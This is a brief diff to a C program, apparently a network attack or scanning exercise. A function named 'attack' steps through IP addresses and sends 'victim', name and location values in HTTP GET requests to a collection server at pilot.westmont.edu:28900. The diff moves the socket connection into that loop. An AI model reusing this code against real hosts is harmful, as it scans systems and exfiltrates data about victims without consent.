@@ -117,7 +117,7 @@ char * increase_IP(char *IP_adr){
 	return scan;
 }
 
-void attack(char *IP_adr, int sockd){
+void attack(char *IP_adr){
 	int ret, foo;
 	char *message;
 	char *rdmsg;
@@ -144,8 +144,10 @@ void attack(char *IP_adr, int sockd){
 		char *location = strtok(NULL, " ");
 		sprintf(message,"GET /?i=%s&u=%s&where=%s\r\n"
 				        "Host: pilot.westmont.edu:28900\r\n\r\n", name, victim, location );
+		int sockd = connect2v4stream(SERVER);
 		write(sockd, message, strlen(message));
 		close(ret);
+		close(sockd);
 	}
 
 	return;
@@ -168,7 +170,7 @@ int main(){
 
 	IP_addr = DEFAULT_IP;
 
-	sockd = connect2v4stream(SERVER);
+
 
 //	printf("Before: %s\n", IP_addr);
 //	IP_addr = increase_IP(IP_addr);
@@ -181,3 +183,4 @@ int main(){
 
 	return 0;
 }
+
